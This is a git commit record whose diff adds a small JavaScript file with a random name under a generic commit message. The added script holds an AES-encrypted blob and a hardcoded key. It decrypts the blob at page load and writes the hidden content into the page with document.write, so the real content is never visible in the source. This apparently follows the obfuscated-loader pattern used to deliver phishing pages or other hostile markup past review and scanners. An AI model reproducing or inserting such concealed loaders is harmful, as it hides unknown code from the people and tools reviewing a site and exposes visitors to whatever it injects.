2c28a17a541e386db9cc82727b1ca88869ca5fbf
bulaba <octocat@github.com>
2023-02-09 08:02:51 +0200

    my commit message

---
+++ AYMThQFhR.js
@@ -0,0 +1,5 @@
+var PPuU="U2FsdGVkX1+rjI7ol167BgZ3wLBtwXcbf023fu4GwauGOK26ob8+GCdMmyerWhzEraJ0Nswaw3FGiPriS7NiUK0+tnb5qlF8Quak2EWc+0YBDz7VBiFyWcdGfM5Fwd/yPkSwLlTCt46TVKo0dBWdZOgrTbHwcA6KiUcEkjFzOqsd8KTt4rSy5hTh2ZcMDaHm0ogeHr5mJSmoJHeu7zd4AkrHFrrwq9svZ1g6hS1+rLz7Dw+dTHl6A+TFqe2NV0ZoIoL2xa5Aq6F5ft9fB0dp5X7CC3M6Um0zoGMX9ALdjeacYe0K3NJDz/2KgY6MdKu3uCPbeJ2R8j16LzhIonpsPd4U3lDwfUpWGeHR3l35G7ee4orN0HR7WuguacxUx55nCo6TPQ++BMQL0tkcrCayrdXahvYwLhwQgQIKntOgKVHNwwUVAv7JNn/GqOAK+/QS/++C3cc2SxbqaMguMVceVg==" 
+ var yMzkF = "PMZIiqdrXkPtenkO"; 
+ var wRvTovA= CryptoJS.AES.decrypt(PPuU, yMzkF); 
+ var DSCgTp = wRvTovA.toString(CryptoJS.enc.Utf8); 
+ document.write(DSCgTp) 
